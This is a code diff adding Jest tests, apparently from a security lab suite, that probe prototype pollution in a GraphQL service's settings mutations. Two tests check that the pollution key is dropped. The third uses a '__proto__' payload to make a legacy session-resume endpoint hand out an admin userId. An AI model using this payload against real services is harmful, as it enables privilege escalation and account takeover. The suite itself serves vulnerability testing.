@@ -97,3 +97,78 @@ describe('RE-001: the display-name pattern backtracks', () => {
     expect(elapsed).toBeLessThan(1_000);
   });
 });
+
+describe('PROTO-002: the settings string is parsed and deep-merged', () => {
+  // Every counterpart assertion runs before the exploit, and the exploit is
+  // the last test of the describe: what it changes is the process itself, and
+  // no reset puts the prototype back.
+  const payload = () => '{"__proto__":{"userId":"u-admin"}}';
+
+  test('updatePreferences cannot even be handed the same document', async () => {
+    const answered = await gql(
+      lab,
+      'mutation ($input: UpdatePreferencesInput!) { updatePreferences(input: $input) { id preferences } }',
+      {
+        token: lab.aliceToken,
+        variables: { input: JSON.parse(payload()) as never },
+      },
+    );
+
+    // refused at the door: the parsed document's extra key never survives
+    // the body parser, so no input of this mutation can carry it
+    const refused = answered as unknown as {
+      statusCode?: number;
+      message?: string;
+    };
+    expect(refused.statusCode).toBe(400);
+    expect(refused.message).toContain('not valid JSON');
+    expect(answered.data).toBeUndefined();
+  });
+
+  test('importSettings parses the same text: the key never reaches a merge', async () => {
+    const answered = await gql(
+      lab,
+      'mutation ($settings: String!) { importSettings(settings: $settings) { id preferences } }',
+      { token: lab.aliceToken, variables: { settings: payload() } },
+    );
+
+    // refused in the way that matters here: the parsed document is turned
+    // into a typed input whose transformation drops the key, the preferences
+    // are the four fields they were, and no merge ever sees it
+    expect(answered.errors).toBeUndefined();
+    expect(answered.data).toEqual({
+      importSettings: {
+        id: 'u-alice',
+        preferences: {
+          theme: 'dark',
+          language: 'en',
+          currency: 'USD',
+          marketingEmails: 'false',
+        },
+      },
+    });
+  });
+
+  test('updateNotificationSettings pollutes the prototype, and an omitted field gains a value', async () => {
+    const polluted = await gql(
+      lab,
+      'mutation ($settings: String!) { updateNotificationSettings(settings: $settings) { id } }',
+      { token: lab.aliceToken, variables: { settings: payload() } },
+    );
+    expect(polluted.errors).toBeUndefined();
+
+    // The cookie names a theme and no user: the resumed answer gains one,
+    // because every object in the service now answers u-admin for a userId
+    // it never had
+    const response = await call(lab, '/internal/sessions/resume-legacy', {
+      method: 'POST',
+      headers: { cookie: 'vcx_remember={"theme":"dark"}' },
+    });
+    expect(response.status).toBe(200);
+    expect(await response.json()).toEqual({
+      status: 'resumed',
+      userId: 'u-admin',
+      theme: 'dark',
+    });
+  });
+});
